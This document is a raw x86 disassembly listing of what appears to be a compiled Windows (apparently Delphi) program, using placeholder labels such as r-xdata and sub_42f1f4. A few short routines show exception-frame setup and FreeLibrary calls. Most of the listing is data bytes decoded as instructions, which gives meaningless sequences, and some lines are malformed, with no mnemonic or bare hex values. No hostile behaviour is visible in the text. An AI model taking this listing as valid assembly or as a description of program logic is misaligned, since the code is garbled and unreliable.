add [ esi + eax * 2 + 0x48 ] ah
add [ edx ] al
inc [ eax ]
add [ esi + eax * 2 + 0x48 ] ah
add [ ebx ] al
inc [ eax ]
add [ esi + eax * 2 + 0x48 ] ah
add [ edi + edi * 8 ] al
add [ eax ] al
inc esi
dec eax
add [ 0x640000ff ] al
inc esi
dec eax
add [ esi ] al
inc [ eax ]
add [ esi + eax * 2 + 0x48 ] ah
add [ edi ] al
inc [ eax ]
add [ esi + eax * 2 + 0x48 ] ah
add [ eax ] cl
inc [ eax ]
add [ esi + eax * 2 + 0x48 ] ah
add [ ecx ] cl
inc [ eax ]
add [ esi + eax * 2 + 0x48 ] ah
add [ edx ] cl
inc [ eax ]
add [ esi + eax * 2 + 0x48 ] ah
add [ ebx ] cl
inc [ eax ]
add [ esi + eax * 2 + 0x48 ] ah
add [ edi + edi * 8 ] cl
add [ eax ] al
inc esi
dec eax
add [ 0x640000ff ] cl
inc esi
dec eax
add [ esi ] cl
inc [ eax ]
add [ edi ] ch
add [ eax ] al
add ah ch
sub [ eax ] ecx
mov bh ch
inc edx
add ah ah
sub [ eax ] ecx
sub bh 0x42
out dx eax
inc edx
add ah dl
sub [ eax ] ecx
jo r-xdata
add ah bl
sub [ eax ] ecx
js r-xdata
out dx eax
inc edx
inc edx
add ah cl
sub [ eax ] ecx
push 0xc40042ef
sub [ eax ] ecx
pushad
out dx eax
inc edx
add [ ecx + ebp - 0x10a7ffb8 ] bh
inc edx
add [ ecx + ebp - 0x10afffb8 ] dh
inc edx
add [ ecx + ebp - 0x10b7ffb8 ] ch
inc edx
add [ ecx + ebp - 0x10bfffb8 ] ah
inc edx
add [ ecx + ebp - 0x10c7ffb8 ] bl
inc edx
add [ ecx + ebp - 0x10cfffb8 ] dl
inc edx
add [ ecx + ebp - 0x10d7ffb8 ] cl
inc edx
add [ ecx + ebp - 0x10dfffb8 ] al
inc edx
add [ ecx + ebp + 0x48 ] bh
add [ eax ] bl
out dx eax
inc edx
add [ ecx + ebp + 0x48 ] dh
add [ eax ] dl
out dx eax
inc edx
add [ ecx + ebp + 0x48 ] ch
add [ eax ] cl
out dx eax
inc edx
add [ ecx + ebp + 0x48 ] ah
add [ eax ] al
out dx eax
inc edx
add [ ecx + ebp + 0x48 ] bl
add al bh
out dx al
inc edx
add [ ecx + ebp + 0x48 ] dl
add al dh
out dx al
inc edx
add [ ecx + ebp + 0x48 ] cl
add al ch
out dx al
inc edx
add [ ecx + ebp + 0x48 ] al
add al ah
out dx al
inc edx
add [ ecx + ebp ] bh
dec eax
add al bl
out dx al
inc edx
add [ ecx + ebp ] dh
dec eax
add al dl
out dx al
inc edx
add [ ecx + ebp ] ch
dec eax
add al cl
out dx al
inc edx
add [ ecx + ebp ] ah
dec eax
add al al
out dx al
inc edx
add [ ecx + ebp ] bl
dec eax
add [ eax + 0x140042ee ] bh
sub [ eax ] ecx
mov al 0xee
inc edx
add [ ecx + ebp ] cl
dec eax
add [ eax + 0x40042ee ] ch
sub [ eax ] ecx
mov al [ 0xfffffffffc0042ee ]
sub [ eax ] cl
cwde
out dx al
inc edx
add ah dh
sub [ eax ] cl
nop
out dx al
inc edx
add ah ch
sub [ eax ] cl
mov dh ch
inc edx
add ah ah
sub [ eax ] cl
inc edx
add ah dl
sub [ eax ] cl
jo r-xdata
sub dh 0x42
add ah bl
sub [ eax ] cl
js r-xdata
inc edx
add ah cl
sub [ eax ] cl
push 0xc40042ee
sub [ eax ] cl
pushad
out dx al
inc edx
add [ eax + ebp - 0x11a7ffb8 ] bh
inc edx
add [ eax + ebp - 0x11afffb8 ] dh
inc edx
add [ eax + ebp - 0x11b7ffb8 ] ch
inc edx
add [ eax + ebp - 0x11bfffb8 ] ah
inc edx
add [ eax + ebp - 0x11c7ffb8 ] bl
inc edx
add [ eax + ebp - 0x11cfffb8 ] dl
inc edx
add [ eax + ebp - 0x11d7ffb8 ] cl
inc edx
add [ eax + ebp - 0x11dfffb8 ] al
inc edx
add [ eax + ebp + 0x48 ] bh
add [ eax ] bl
out dx al
inc edx
add [ ebp - 0x75 ] dl
in al dx
xor eax eax
push ebp
push sub_42f148
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42f14f
retn
mov eax rw-data
mov ecx 0x2f
mov edx [ r-xdata ]
call sub_404c00
sub_42f184
inc esi
dec eax
add [ edi ] cl
inc [ eax ]
add [ esi + eax * 2 + 0x48 ] ah
add al dh
inc [ eax ]
add [ esi + eax * 2 + 0x48 ] ah
add cl dh
inc [ eax ]
add [ esi + eax * 2 + 0x48 ] ah
add dl dh
inc [ eax ]
add [ esi + eax * 2 + 0x48 ] ah
add bl dh
inc [ eax ]
add [ esi + eax * 2 + 0x48 ] ah
add ah dh
inc [ eax ]
add [ esi + eax * 2 + 0x48 ] ah
add ch dh
inc [ eax ]
add [ ebp - 0x75 ] dl
in al dx
xor eax eax
push ebp
push sub_42f1e1
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42f1e8
retn
sub_42f1f4
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_42f225
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42f22c
retn
mov eax [ rw-data ]
call sub_403368
sub_42f2dc
or al [ eax ]
add [ eax ] al
sbb [ edx ] ch
dec eax
add ah dh
aaa
dec eax
add [ eax ] al
add [ eax ] al
add [ edx + ebp ] dl
dec eax
add [ eax + 0x36 ] al
dec eax
add [ eax ] al
add [ eax ] al
add [ eax ] dl
sub cl [ eax ]
enter 0x4835 0x0
add [ eax ] al
add [ eax ] al
or al 0x2a
dec eax
add [ eax ] cl
aaa
dec eax
add [ eax ] al
add [ eax ] al
add [ eax ] cl
sub cl [ eax ]
cmp [ eax ] bh
dec eax
add [ eax ] al
add [ eax ] al
add [ edx + ebp ] al
dec eax
add [ eax + 0x3b ] al
dec eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
sub cl [ eax ]
mov [ eax ] bh
dec eax
add [ eax ] al
add [ eax ] al
add ah bh
sub [ eax ] ecx
dec esp
cmp [ eax ] ecx
add [ eax ] al
add [ eax ] al
clc
sub [ eax ] ecx
add al 0x3b
dec eax
add [ eax ] al
add [ eax ] al
add ah dh
sub [ eax ] ecx
hlt
sub_42f3b8
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_42f3dd
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42f3e4
retn
sub_42f3ff
inc [ ecx ]
add [ eax ] al
add [ ecx ] dh
add [ eax ] al
add [ ebp - 0x75 ] dl
in al dx
xor eax eax
push ebp
push sub_42f444
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42f44b
retn
mov eax rw-data
mov ecx 0x2
mov edx [ r-xdata ]
call sub_404c00
sub_42f467
inc [ ecx ]
add [ eax ] al
add [ ecx ] dh
add [ eax ] al
add [ ebp - 0x75 ] dl
in al dx
xor eax eax
push ebp
push sub_42f4ac
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42f4b3
retn
mov eax rw-data
mov ecx 0x2
mov edx [ r-xdata ]
call sub_404c00
sub_42f4c3
dec [ edx ]
add [ eax ] al
add [ ebp + 0x41 ] cl
push eax
dec ecx
xor esi [ edx ]
inc esp
dec esp
dec esp
add [ eax ] al
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_42f519
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42f520
retn
cmp [ rw-data ] 0x0
je r-xdata
mov eax rw-data
call sub_404164
mov eax [ rw-data ]
push eax
call FreeLibrary
sub_42f52c
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_42f570
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42f577
retn
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ rw-data ]
push eax
call FreeLibrary
sub_42f584
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_42f5a9
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42f5b0
retn
sub_42f700
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
push 0x900042f7
test [ edx ] 0x0
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
jpe r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx - 0x9 ] bh
inc edx
add [ eax ] ch
add [ eax ] al
add [ edx + 0x41 ] bh
add [ eax - 0x5bffbfcb ] bl
xor eax 0x35a80040
inc eax
add [ ebp + esi + 0x35a00040 ] ch
inc eax
add [ eax ] al
xor eax [ eax ]
sbb al 0x33
inc eax
add [ edx + edx * 4 + 0x41 ] al
add [ eax - 0x5fffbe71 ] bl
pop [ ecx ]
int3
sub_42fd29
push ecx
inc esp
add ah dh
sbb [ edx ] al
movsb [ edi ] [ esi ]
xor eax 0x12480040
inc edx
add [ ebp + esi - 0x2cd3ffc0 ] ch
inc esp
add [ eax ] al
xor eax [ eax ]
sbb al 0x33
inc eax
add [ eax - 0x33ffbccc ] dh
add al [ ebp ]
hlt
sub_42fe0e
inc esp
add [ edi + esi * 8 ] dh
inc esp
add [ eax - 0x17ffbcbb ] dh
inc ebp
inc ebx
add [ ebx + eax * 2 ] bl
inc ebx
add [ 0x2bb03c00 ] cl
mov esp 0x201bc4e
add eax 0xb3004700
push [ edx - 0x4f004e01 ]
[ edi - 0x49005101 ]
sub_42ff94
add dh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
adc [ eax ] eax
or [ edx + esi * 2 + 0x61 ] al
dec ebp
outsd
add [ gs : eax ] dl
inc eax
add [ edx ] ah
add al [ eax ]
[ edx + edi ]
sub_430025
call sub_4344d9
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
adc eax 0x6e450700
popad
bound ebp [ ebp + 0x64 ]
cmp [ edx + eax * 2 ] ch
add [ eax ] ch
add bh bh
test al 0x90
inc esp
add [ eax + 0x4490 ] bh
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x46040016 ] al
outsd
outsb
je r-xdata
inc esp
add [ eax ] al
pop esi
inc ebp
add [ eax ] ch
add al [ eax ]
call eax
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x49060017 ] al
insd
popad
jae r-xdata
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
pop ss
add [ esi ] al
dec ecx
inc edx
inc esp
add [ eax + eax ] dh
jmp [ eax + 0x10044b4 ]
sub_430482
inc esp
add [ edi + esi * 8 ] dh
inc esp
add [ eax - 0x17ffbcbb ] dh
inc ebp
inc ebx
add [ ebx + eax * 2 ] bl
inc ebx
add [ esi ] cl
push esp
dec eax
popad
jb r-xdata
add [ ecx ] 0x0
add [ eax ] al
or eax [ eax ]
add eax 0x67696c41
outsb
inc esp
inc edx
inc esp
add [ ecx ] ah
add bh bh
outsd
outsb
je r-xdata
aad 0x44
add [ ecx + ecx - 0xbbbffbb ] bl
inc esp
add [ ebx + eax * 4 + 0x44 ] bh
add [ eax ] al
add [ eax ] al
add [ ebx ] 0x0
add [ eax ] al
or al 0x0
pop es
inc ecx
outsb
arpl [ eax + 0x6f ] bp
jb r-xdata
pop edi
add [ eax ] al
push [ eax ]
outsd
insb
nop
test al 0x4
inc ebx
add [ edi ] al
push cs
push esp
dec eax
popad
jb r-xdata
add [ eax ] al
[ ebx + 0x1ff0000 ]
cld
pop eax
inc ecx
add [ eax ] al
add [ ecx ] dl
add [ eax ] cl
inc esp
jb r-xdata
jb r-xdata
loopne r-xdata
outsd
outsb
je r-xdata
add dh bh
fcom [ eax + 0x44 ]
add [ eax - 0x80000000 ] al
or eax 0x69420800
inc esp
imul ecx [ ebp + 0x6f ] 0x50bc6564
add [ eax ] al
add [ eax + 0x46040016 ] al
outsd
outsb
je r-xdata
dec ebp
outsd
add [ gs : eax ] dl
inc eax
add [ edx ] ah
add al [ eax ]
[ edx + edi ]
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
adc [ eax ] eax
or [ edx + esi * 2 + 0x61 ] al
imul esp [ esp + esi * 2 + 0x68 ] r-xdata
jpe r-xdata
inc esp
add [ ecx + eax ] ch
call esp
add [ eax ] cl
inc edx
imul eax [ ecx + ebp * 2 + 0x4d ] 0xbc65646f
push eax
outsd
insb
rol [ ebx ] 0x43
add [ eax + 0x330042fe ] cl
add [ eax ] cl
inc ebx
outsd
insd
inc ebx
je r-xdata
adc [ eax ] al
and [ edx ] al
add bh bh
add bh bh
jpe r-xdata
clc
inc esp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
push cs
add [ ebx ] cl
inc edx
outsd
jb r-xdata
insb
jae r-xdata
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0xc ] al
str [ edx ]
inc esp
jb r-xdata
jmp eax
add [ eax ] dl
cmp eax [ eax + eax + 0x5b ]
add [ eax ] al
jmp [ eax + 0x1004484 ]
add [ eax ] al
add [ eax ] al
adc al [ eax ]
or eax [ edx + esi * 2 + 0x61 ]
push edx
outsd
jb r-xdata
inc ebx
jne r-xdata
popad
add [ bx + si ] dl
inc eax
add [ ecx ] ah
add al [ eax ]
inc [ edx + edi ]
inc ebx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
adc al 0x0
or [ eax + 0x6f ] cl
je r-xdata
jb r-xdata
add [ eax ] dl
add dh bh
add [ fs : eax ] al
jae r-xdata
cmp al [ ebx ]
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
jb r-xdata
adc [ eax ] al
push eax
add [ eax ] al
inc eax
jb r-xdata
adc [ eax ] al
cdq
add [ eax ] al
inc [ ecx + edx * 4 ]
sbb [ eax ] eax
or [ ebx + 0x65 ] dl
arpl [ ecx + ebp * 2 + 0x6f ] si
arpl [ ebx - 0x34 ] bp
pop esi
inc ebp
add [ eax ] ch
add al [ eax ]
call eax
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x49060017 ] al
add [ edi ] bl
add bh bh
jo r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
adc [ eax ] al
or [ edx + esi * 2 + 0x61 ] al
dec ebx
imul ebp [ esi + 0x64 ] r-xdata
pop ebp
add [ eax ] al
jmp [ eax ]
inc ecx
inc esp
add [ ebx - 0x64010000 ] bl
add [ eax ] al
inc [ ecx ]
outsb
jae r-xdata
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x53080019 ] al
arpl [ gs : ecx + ebp * 2 + 0x6f ] si
cld
inc edx
add [ edx + eax ] ch
add bh bh
sbb [ edx ] bh
inc ebx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
sbb al [ eax ]
add eax 0x6c797453
add [ gs : eax ] dl
inc eax
add [ eax ] ah
add bh bh
insb
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
and eax [ eax ]
push cs
push eax
popad
jb r-xdata
insd
popad
jae r-xdata
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
pop ss
add [ esi ] al
dec ecx
inc edx
inc esp
add [ eax + eax ] dh
jmp [ eax + 0x10044b4 ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x50090026 ] al
outsd
outsb
je r-xdata
arpl [ ecx + ebp * 2 + 0x6f ] si
jo r-xdata
add [ eax ] al
and eax 0x61500e00
jb r-xdata
imul eax [ ecx + ebp * 2 + 0x4d ] 0x65646f
adc [ eax ] al
pop ecx
add [ eax ] al
jmp eax
add [ eax ] eax
[ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f09002c ] al
xchg esp eax
inc ebp
inc esp
add al ch
add [ eax ] al
jo r-xdata
outsb
jne r-xdata
add [ eax ] al
sub [ eax ] 0x0
outsb
je r-xdata
add [ eax ] al
add [ eax + 0x4f09002f ] al
outsb
dec ebp
outsd
jne r-xdata
test al 0x43
inc esp
add al dl
add [ eax ] al
call eax
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
inc ebp
inc esp
add al dh
add [ eax ] al
push eax
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0a002a ] al
cld
inc edx
add [ eax + 0x2 ] dh
add bh bh
jo r-xdata
outsb
inc ebx
outsd
outsb
je r-xdata
adc [ eax ] al
push edi
add [ eax ] al
call esp
mov es [ eax + eax + 0x48 ]
mov al 0x44
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
inc esp
jb r-xdata
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
sub al [ eax ]
or cl [ edi + 0x6e ]
js r-xdata
push cs
dec edi
add bh bh
xor [ ecx ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
sub [ eax ] al
push 0x6948776f
outsb
je r-xdata
insb
imul esp [ ebx + 0x6b ] r-xdata
cwde
stosd [ edi ]
inc ebx
add al bh
stosd [ edi ]
inc ebx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0f0020 ] al
outsb
push ebx
arpl [ gs : ecx + ebp * 2 + 0x6f ] si
outsb
push ebp
jo r-xdata
add al [ ebx ]
jo r-xdata
inc esp
outsd
ja r-xdata
add [ eax + 0x4f0b002d ] al
add [ eax ] al
dec edi
jbe r-xdata
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
sbb eax [ eax ]
adc al 0x4f
outsb
inc ebx
jb r-xdata
add bh bh
outsb
dec edi
push eax
outsd
jo r-xdata
imul ecx [ ebp + 0x6f ] 0x10006564
inc eax
add [ ecx ] bl
add bh bh
loopne r-xdata
add [ ebp ] 0x7c
add [ eax ] al
[ edi + ecx * 4 + 0x44 ]
add [ eax + 0x4f10001f ] al
outsb
push ebx
arpl [ gs : ecx + ebp * 2 + 0x6f ] si
outsb
inc ebp
outsb
inc esp
jb r-xdata
jpe r-xdata
arpl [ gs : ecx + ebp * 2 + 0x6f ] si
pop edx
inc ecx
add al bh
add [ eax ] al
outsd
jne r-xdata
inc ebx
add al al
stosd [ edi ]
inc ebx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0d001c ] al
outsb
inc esp
and [ esp + eax * 2 ] al
fadd [ eax ]
add bh bh
fadd [ eax ]
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
add [ cs : ebx ] cl
dec edi
outsb
dec ebp
outsb
dec ebp
outsd
jne r-xdata
jb r-xdata
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
sub eax [ eax ]
or [ edi + 0x6e ] ecx
popad
je r-xdata
inc esp
add ah cl
nop
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x53080022 ] al
push 0x6948776f
outsb
je r-xdata
add bh bh
add al 0x91
inc esp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
and al 0x0
or dl [ eax + 0x61 ]
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
cld
inc edi
inc esp
add [ eax ] al
add [ eax ] eax
inc [ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0b0031 ] al
outsb
add [ eax ] al
call 0xffffffffac434cd9
stosd [ edi ]
outsb
mov [ edx ] es
inc ebx
add [ ebx + ebp * 4 - 0x5423ffbd ] al
inc ebx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0e001d ] al
outsb
push ebx
arpl [ gs : ecx + ebp * 2 + 0x6f ] si
outsb
inc ebx
dec ebp
outsd
jbe r-xdata
inc ebx
add [ esp + ebp * 4 ] dl
inc ebx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0e0021 ] al
outsb
push ebx
arpl [ gs : ecx + ebp * 2 + 0x6f ] si
outsb
push esp
jb r-xdata
ja r-xdata
outsb
inc ebp
outsb
inc esp
jb r-xdata
add [ ecx ] cl
dec edi
inc ebp
outsb
inc esp
outsd
arpl [ ebx + 0x3c ] bp
inc esi
inc esp
add [ eax ] bl
inc esi
inc esp
add [ eax ] cl
add [ eax ] eax
dec [ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f09002b ] al
outsb
outsb
inc ebx
insb
popad
jae r-xdata
push ebx
arpl [ gs : ecx + ebp * 2 + 0x6f ] si
daa
add [ edi ] al
push esi
imul esi [ ebx + 0x69 ] 0xd0656c62
dec edx
inc esp
add [ eax ] dh
add [ eax ] eax
push [ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0e0028 ] al
add [ eax + 0x1 ] al
outsb
je r-xdata
add [ eax - 0x53ffbfcb ] ch
xor eax 0x35a00040
jb r-xdata
push ebx
je r-xdata
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
xor [ eax ] eax
or ecx [ edi + 0x6e ]
arpl [ ebx - 0x30 ] bp
sti
inc edx
add [ eax + 0x2 ] ah
add bh bh
pushad
add al [ eax ]
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0d001e ] al
outsb
push ebx
arpl [ gs : ecx + ebp * 2 + 0x6f ] si
outsb
inc esp
jb r-xdata
jb r-xdata
test al 0x43
inc esp
add al ah
add [ eax ] al
jmp eax
push edx
jae r-xdata
jo r-xdata
or [ eax + 0x6f ] edx
outsd
outsb
je r-xdata
bound esi [ ebx + 0x44 ]
jb r-xdata
inc ebp
inc ebx
add [ esi + eax * 2 ] cl
inc ebx
add [ ebx ] cl
push esp
inc ebx
outsd
outsb
pop eax
xor eax [ eax ]
clc
inc esp
outsd
arpl [ ebx - 0xc ] bp
inc ebp
inc esp
add [ eax ] dl
add [ eax ] eax
call [ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0b0032 ] al
outsb
push ebx
je r-xdata
inc esp
pop edx
inc ecx
add [ eax + 0x2 ] ch
add bh bh
push 0x1ff0002
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
adc [ eax ] al
0x28ff0000 0x4491
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
loopne r-xdata
jo r-xdata
jo r-xdata
imul ebp [ edi + 0x6e ] r-xdata
push cs
jbe r-xdata
jb r-xdata
add [ edx + ebx ] ch
inc edx
add [ eax - 0x23ffbde6 ] al
inc edx
add al cl
0x1a140043 0x42
add [ eax + 0xc ] dl
inc ebx
outsd
ja r-xdata
add al ah
jb r-xdata
popad
jb r-xdata
imul ebp [ edi + 0x6e ] 0x6d726f46
popad
je r-xdata
inc esp
jb r-xdata
add [ eax + 0x7f ] bl
inc esp
add [ eax - 0x65 ] bh
inc ebx
add [ eax + 0x56 ] bl
inc ebp
add [ edi + edi * 2 + 0x44 ] bh
add ah ch
jl r-xdata
add ah ch
0x7e500043 0x44
movsb [ edi ] [ esi ]
push ebp
inc ebp
add [ eax - 0x37ffbaab ] bh
jg r-xdata
enter 0x439a 0x0
or al 0x74
bound esi [ ebx + 0x53 ]
jo r-xdata
add [ eax - 0x65 ] bl
inc ebx
add [ eax ] bh
jg r-xdata
add [ eax + 0x1a ] cl
inc edx
add [ edi + edi * 2 + 0x19980044 ] bl
inc edx
sbb [ edx ] eax
je r-xdata
jb r-xdata
add [ eax ] al
add [ eax + r-xdata ] dl
add edx [ eax ]
push esp
push esp
outsd
outsd
insb
inc edx
jne r-xdata
add [ eax ] al
add [ ecx ] al
adc [ ebx + eax * 2 + 0x6f ] edx
outsb
jbe r-xdata
outsd
outsb
add [ ebx ] cl
inc ebx
add [ esi ] cl
inc eax
add [ eax ] al
xor eax [ eax ]
sbb al 0x33
inc eax
add [ eax + 0x33 ] bl
inc eax
add al bh
mov eax eax
call sub_434dab
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al dh
or al [ ebx ]
add al 0x0
add [ eax ] al
mov al 0x10
inc eax
add [ eax - 0x5bffbfcb ] bl
xor eax 0x35a80040
inc eax
add [ ebp + esi + 0x35a00040 ] ch
add ah dh
sbb [ edx ] al
movsb [ edi ] [ esi ]
xor eax 0x12480040
inc edx
add [ ebp + esi - 0x5c1fffc0 ] ch
inc esp
add [ eax ] al
xor eax [ eax ]
sbb al 0x33
inc eax
add [ eax ] bh
or al [ ebp ]
push 0xb8004353
movsb [ edi ] [ esi ]
inc esp
add [ esi + ecx * 4 - 0x4f77ffbf ] dh
inc esp
add al cl
inc edi
inc ebx
add al cl
add [ eax + eax - 0x64 ] 0xffffff8d
inc esp
add [ ecx + ebx ] cl
add [ 0x6f6f5454 ] dl
insb
inc edx
jne r-xdata
add [ esi + edi * 2 - 0x64dfffbc ] al
inc ebx
add [ eax ] cl
push esi
inc ebp
add [ esi + edi * 2 + 0x56300044 ] bh
inc ebp
add [ eax ] bl
jg r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x430d ] dh
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebp + ecx + 0x43 ] dl
add [ esi - 0x77ffbcf3 ] bl
add [ eax ] eax
add al dl
push ebp
inc esp
add [ eax + 0x56 ] al
inc ebp
add [ eax + eax * 4 + 0x44 ] cl
add [ eax + eax * 4 ] ch
inc esp
add [ eax + eax * 4 + 0x44 ] ch
sbb al [ edx ]
pushfd
jg r-xdata
jb r-xdata
nop
inc ebx
outsd
add [ eax + eax ] ah
add [ eax ] al
push eax
or al 0x43
je r-xdata
lea eax [ eax + eax + 0xc ]
sbb [ edx ] eax
hlt
je r-xdata
shl [ esp + ecx + 0x43 ] 0x0
jge r-xdata
add [ eax + 0x2c004219 ] bl
sbb al [ edx ]
sbb [ edx ] 0x42
add ah bl
insd
inc ebx
je r-xdata
or [ ebx + 0x6f ] al
je r-xdata
insb
jae r-xdata
add [ eax ] al
add [ eax ] al
outsb
push ebx
je r-xdata
inc edx
add ah dh
adc eax 0x15ec0042
inc edx
add [ ecx + ebx ] dl
inc edx
add [ eax ] ah
inc esi
inc ebx
add [ eax - 0x61 ] dl
inc esp
add [ edi + ebx * 4 + 0x44 ] cl
add [ eax ] bl
inc esp
add al dl
add [ eax + eax + 0x3c ] 0x8a
inc esp
add [ eax - 0x37ffbb77 ] ah
xchg edx eax
inc esp
add [ eax ] bl
add [ eax + eax + 0x1c ] 0x82
inc esp
add [ eax - 0x4e ] bl
inc esp
add [ edx + esi * 4 + 0x4d600044 ] al
inc ebx
add [ ebx + eax * 4 - 0x70efffbc ] dl
inc esp
add [ eax - 0x63ffbb72 ] cl
xchg ecx eax
inc esp
add [ eax - 0x70 ] cl
inc esp
add [ edx + 0x44 ] cl
add [ eax ] cl
mov bl 0x44
add [ eax - 0x3ffbb6c ] cl
xchg esp eax
inc esp
add [ eax + ecx * 2 + 0x43 ] bl
add ah bl
xchg esp eax
inc esp
add [ eax + 0x4a ] cl
inc ebx
add ah dh
push ecx
inc ebx
add ah bh
push ecx
inc ebx
add [ eax ] dh
push edx
inc ebx
add [ edx + edx * 2 + 0x43 ] dl
add [ eax + eax ] cl
or al 0xb0
or dh [ eax - 0x4ff44fee ]
out dx eax
inc esp
add [ ebp + ecx * 4 + 0x190c0044 ] bl
outsb
inc ecx
arpl [ ecx + ebp * 2 + 0x6f ] si
